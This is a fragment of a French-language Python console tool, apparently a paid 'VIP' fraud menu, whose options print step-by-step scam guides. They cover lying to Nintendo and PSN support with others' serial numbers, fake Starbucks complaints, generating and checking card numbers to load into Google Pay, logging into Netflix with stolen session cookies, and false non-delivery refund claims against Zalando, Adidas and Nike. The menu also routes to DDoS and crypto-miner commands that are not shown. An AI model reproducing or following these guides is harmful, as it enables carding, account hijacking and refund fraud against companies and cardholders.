    time.sleep(1)
    from os import system
    print("""
    Technique Carte Cadeaux
    1) Allez à https://pointsprizes.com/r/19120
    2) Connectez-vous avec un e-mail actif
    3) Rendez-vous à l'onglet "Utiliser les coupons" à gauche
    4) Utilisez tous ces coupons MARVELOUSEXCLUSIF10
    HELPCENTER10
    POINTYNEWYEAR50
    BEERMONEY3573
    TWEETR562
    LOC1052300
    GOOGCOM294
    FACEGROUP900
    BEERMONEY3573
    LÉLÉGÉTIE
    L'ÉGENTE D'INFORMITÉ
    MIGHTYSALEH25
    FACEPAGE1920
    ROY25
    ICE50
    FONCASSE50
    DELTA100 RANKER25
    POINTSPRIZES25
    5) D'accord maintenant, vous avez 500 Points, dirigez-vous vers l'onglet "Liens d'aiguillage" à gauche.
    6) Oui, maintenant vous allez faire la partie pilote automatique. Trouvez un lien avec un point bonus 3x et éditez ce guide ou faites le vôtre
    Enseigner aux gens comment obtenir des cartes-cadeaux gratuites avec ce lien de référence. Il est très facile d'obtenir 1000 Points dans une heure de cette méthode. MENEZ UTILISER LES COUPONS !
    """)
    input("")
  elif reponse=="30":
    time.sleep(1)
    from os import system
    print("""
    Technique nitendo switch
    1. Allez sur le site Shpock ou téléchargez l'application (c'est gratuit).
    2. Trouvez une "Nintendo Switch" avec un numéro de série clairement visible qui se trouve à gauche des connecteurs USB à l'arrière.
    3. Allez sur Nintendo Live Chat ou téléphonez-leur et dites que vous l'avez donné à votre fille en cadeau et qu'il ne fonctionne pas et que vous ne l'avez jamais utilisé et que vous avez entendu qu'un numéro de série aiderait.
    4. Ils devraient ensuite vous demander le numéro de série et leur donner celui que vous avez trouvé sur l'annonce Shpock.
    5. Continuez et continuez la conversation et éventuellement ils devraient vous en envoyer un tout nouveau.
    """)
    input("")
  elif reponse=="31":
    time.sleep(1)
    from os import system
    print("""
    Technique Starbucks
    1. Effectuez une recherche sur google (service client Starbucks 
    2. Cliquez sur nous contacter et dans nos magasins 
    3. Remplissez le formulaire dont le sujet est (boisson que j'ai commandée dans un magasin) 
    4. Pour le raisonnement (réclamez-vous d'une boisson que vous avez commandée ils se sont trompés ou ont pris trop de temps, etc. .. tout fonctionne) 
    5. Mettez n'importe quel emplacement Starbucks que vous connaissez, ou recherchez-en un 
    6. Et pour le courrier électronique, utilisez un compte Starbucks si vous n'en avez pas, faites-en un - si vous n'en avez pas, ils finiront par envoyer votre carte-cadeau au lieu de l'appliquer instantanément à votre compte 
    7. Choisissez une heure et une date, etc. la carte-cadeau est appliquée à votre compte Starbucks ou vous est envoyée par la poste.
    """)
    input("")
  elif reponse=="32":
    time.sleep(1)
    from os import system
    print("""
    Etape 1 : Créez une nouvelle adresse gmail.
    Etape 2 : Connectez la nouvelle adresse email sur le site de Google Pay ici : https://pay.google.com/gp/w/u/0/home/paymentmethods?sctid=3349011462073413
    Etape 3 : Ajoutez une méthode de paiement.
    Etape 4 : Ouvrez un nouvel onglet dans votre navigateur et allez sur : https://namso-gen.com/ Une fois sur le site, copiez collez ce bin : 489504xxx56xx566 dans BIN. Dans QUANTITY, écrivez 100. Générez ensuite les cartes bancaires à partir du bin. Puis copiez toutes les cartes de la case de droite (ctrl+a et ctrl+c)
    Etape 5 : Créez encore un nouvel onglet et tapez mrchecker. Ce site permettra de vérifier les cartes copiées auparavant. Collez les cartes que vous aviez copié dans le rectangle blanc prévu pour mettre les cartes. Faites "START" puis descendez et attendez qu'il y ait des cartes "Live". Copiez en une pour la mettre dans le site de Google Pay.
    Etape 6 : Retournez ensuite sur le site de Google Pay ou cela vous demande la carte. Commencez par mettre le pays aux Etats-Unis.
    Etape 7 : Rentrez les infos de la carte bancaire, puis rentrez une adresse aux Etats-Unis du modèle "4 street ..."
    Etape 8 : Quand toutes les informations sont rentrées, validez et la carte s'enregistre automatiquement dans le compte.
    Etape 9 : Mettez ensuite le compte (si ce n'est pas déjà fait sur votre appareil android).
    Etape 10 : Installez l'application où vous souhaitez utiliser la période d'essais !
    """)
    input("")
  elif reponse=="33":
    time.sleep(1)
    from os import system
    print("""
    Technique pour faire des intro et outro
    1) Allez sur https://panzoid.com/
    2) Choisissez le type que vous voulez par exemple montage, backgroup 3d et clipmaker (Intro et outro)
    3) Choisissez le modèle qui vous plaît le plus et modifier le nom 
    4) Téléchargez l'intro ou l'outro.
    """)
    input("")
  elif reponse=="34":
    time.sleep(1)
    from os import system
    print("""
    1- Allez sur "PSN contactez-nous" et saisissez toutes vos informations PSN
    2- Sélectionnez le chat en direct
    3- Dites-leur que vous venez de recevoir votre PS4 et que vous ne l'avez pas aimé, assurez-vous d'avoir un ton professionnel, dites quelque chose dans le sens "J'ai acheté une PS4 à ma fille ou à mon fils et il a été victime d'intimidation et tout, y a-t-il un moyen que PSN face quelque chose". Ils vous transféreront ensuite à une autorité supérieure et des accords seront conclus à partir de là
    4- Demandez environ 20€ de gc PSN, Négociez avec lui.
    """)
    input("")
  elif reponse=="35":
    time.sleep(1)
    from os import system
    print("""
    1 : Achat d'une carte SIM SFR rechargé 10€ dans n'importe quel tabac disponible partout
    2 : insérer la carte SIM dans le téléphone en question
    3 : Installer l'appli AnonyTun (https://play.google.com/store/apps/details?id=com.anonytun.android) et le mettre en mode gaming avec l'icône manette
    4 : Activer avec le boutton du milieu
    Vous ne pouvez pas faire de partage de connexion mais vous pouvez utiliser votre 4g.
    """)
    input("")
  elif reponse=="36":
    time.sleep(1)
    from os import system
    print("""
    Tu crée un double compte avec les perms admin sur ton serveur 
    Ensuite tu va sur ce site : https://join4join.xyz/
    Ensuite tu farm les pièces 
    1 pièce = 1 membres 
    Ensuite tu fait manager et tu paye t’es membre et tu attends un peut il vont venir 
    1 compte créer = 20 pièces par compte.
    """)
    input("")
  elif reponse=="37":
    time.sleep(1)
    from os import system
    print("""
    1)
    Etape 1 : Avoir un compte neutre avec 0
    commande effectuées.
    Etape 2 : Entrer le code promotionnel
    « MIAM15 » dans les paramètres d’Uber Eats.
    Etape 3 : Payer une commande avec l’option
    « 1 acheté 1 offert »
    Etape 4 : Payer la commande à emporter et
    non en livraison. (Si vous êtes vraiment loin
    du fast-food pour aller chercher votre
    commande, vous pouvez payer en livraison
    mais cela coûtera dans les alentours des 2€)
    Etape 5 : Mangez et kiffez gratuitement ! 
    2 ) 
    https://cdn.discordapp.com/attachments/1002600595561132193/1002600981319655484/Refund_Uber-eat.pdf
    """)
    input("")
  elif reponse=="38":
    time.sleep(1)
    from os import system
    print("""
    technique Netflix :
    1. Rendez-vous sur www.accountspool.com et téléchargez leurs extensions pour Chrome. https://prnt.sc/rrjmnf
     2. Après le téléchargement, extraire le fichier
    3. Redémarrez votre navigateur chrome
    4. Cliquez sur le navigateur Chrome et cliquez sur l'icône de personnalisation de la barre d'outils, sur d'autres outils et sélectionnez les extensions. https://prnt.sc/rrk3ui
    5. Assuré vous d'activer le mode développeur https://prnt.sc/rrk4qm
    6. Clicker sur Load Unpacked https://prnt.sc/rrk66l
    7. Allé au fichier nommé compte Pool que vous venez de dezippé. Double clicker et clicker sur Ouvrir le fichier https://prnt.sc/rrk7yr
    8. Maintenant vous devez voir les extensions https://prnt.sc/rrkdld
    9. Allez sur https://tecknity.com/ et recherchez « Free Netflix account cookies » et cliquez sur la première trouvaille. https://prnt.sc/rrktfw
    10. Faites défiler vers le bas jusqu'à ce que vous voyiez des COOKIES. Les COOKIES peuvent atteindre 20 ou même plus. Clicker sur l'un des COOKIES que vous voyez. http://prnt.sc/rrkxyq
    11. Attendez que le lien soit prêt et clicker sur "aller au lien" http://prnt.sc/rrl1h3
    12. Cochez la case "je ne suis pas un robot puis résoudre le captcha https://prnt.sc/rrl2u4
    13. Maintenant vous voyez les COOKIES. Pour que ces derniers fonctionnent, vous ne devez pas être sous VPN ou Proxies. Désactivez aussi votre traducteur pour qu'il ne les déforme pas. Puis copier les COOKIES sans problème. https://prnt.sc/rrl5f
    14. Maintenant clicker sur l'icône de l'extension Accounts Pools puis sur "Accept and continue" https://prnt.sc/rrl70u
    15. Cliquez ensuite sur "use cookies" et vous serrez rediriger vers la page netflix parcourez https://prnt.sc/rrlb03
    16. Et BOOOM, vous avez votre compte. Vous tomberai peut-être sur un compte avec des écritures arabes, dans ce cas ils vont falloir changer les Cookies et réessayer. https://prnt.sc/rrldwl
    """)
    input("")
  elif reponse=="39":
    time.sleep(1)
    from os import system
    print("""
    https://cdn.discordapp.com/attachments/1002600595561132193/1002606082990018620/2021_HOTEL_METHOD_.zip
    """)
    input("")
  elif reponse=="40":
    time.sleep(1)
    from os import system
    print("""
    Technique pour avoir full hearts, followers, likes, views tiktok
    - https://zefoy.com/
    """)
    input("")
  elif reponse=="41":
    time.sleep(1)
    from os import system
    print("""
    Technique pour avoir full hearts, followers, likes, views instagram :
    https://fr.mrpopular.net/getfree.php
    """)
    input("")
  elif reponse=="42":
    time.sleep(1)
    from os import system
    print("""
    Zalando nécessite 4 articles bon marchés (10 €) et 3 articles coûteux (pas d'accessoire)
    Adidas et Nike nécessite 2 articles bon marché (10-20€) et 2 articles coûteux.
    Les articles doivent arrivez dans un seul et même carton !
    Prenez la livraison gratuite, pour éviter d'éveiller les soupçons (à vos risques et périls si vous choisissez la livraison express).
    Une fois que vous avez reçu votre colis, contactez le service client par téléphone .
    Dites que vous n'avez pas reçu que une partie de votre commande, dites que vous n'avez pas reçu uniquement les articles cher !
    Vous donnez le numéro de produite des ses articles, et vous allez recevoir un mail du support et vous devrez remplir un formulaire.
    Remplissez le et votre remboursement sera effectué !
    """)
    input("")
  else:
    print("Veuillez entrer un chiffre entre 1 et 42")  
  main()



      


def VIP():
    System.Title("VIP - Total Clients[1] - Online[1] - Expiring[∞]days ")
    System.Size(83, 24)
    Log = Write.Input("Login as : ", Colors.white_to_blue, interval=0.005)
    resplogin = requests.get('https://pastebin.com/raw/cNPZJJva')
    respmdp = requests.get('https://pastebin.com/raw/H53dhkq4')
    result = resplogin.text.split()
    resultmdp = respmdp.text.split()

    if Log in result:      
        Log2 = Write.Input(Log+"@password : ", Colors.white_to_blue, interval=0.005)
        if Log2 in resultmdp:
                    os.system('cls')
                    main()
        else:
                print(Colorate.Horizontal(Colors.red_to_yellow, "Error Syntax 404"))
                time.sleep(2)
                VIP()

    else:
       print(Colorate.Horizontal(Colors.red_to_yellow, "Error Syntax 404"))
       time.sleep(2)
       VIP() 
def main():
        resplogin = requests.get('https://pastebin.com/raw/cNPZJJva')
        respmdp = requests.get('https://pastebin.com/raw/H53dhkq4')
        resultat = resplogin.text.split()
        resultmdp = respmdp.text.split()
        System.Title("VIP - Total Clients[1] - Online[1] - Expiring[Illimited]days - identity: [{root}]" )
        System.Size(83, 24)
        barreH()
        interface()
        print (Colorate.Horizontal(Colors.purple_to_blue, (barre)))
        cmd = Write.Input("╚══>", Colors.purple_to_blue, interval=0.005)
        if cmd == 'help':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface1()
        if cmd == 'clear':
            main()
        if cmd == 'exit':
           exit()
        if cmd == 'rules':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface4()
        if cmd == 'tech':
            os.system('cls' if os.name == 'nt' else 'clear')
            interfacetech()
        if cmd == 'gen':
            os.system('cls' if os.name == 'nt' else 'clear')
            gen()
        if cmd == 'ddos':
            os.system('cls' if os.name == 'nt' else 'clear')
            ddos()
        if cmd == 'btcminer':
            os.system('cls' if os.name == 'nt' else 'clear')
            btcminer()
        if cmd == 'tools':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface5() 
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, "Error Syntax 404"))
            time.sleep(2)
            main()

if __name__ == '__main__':
    VIP()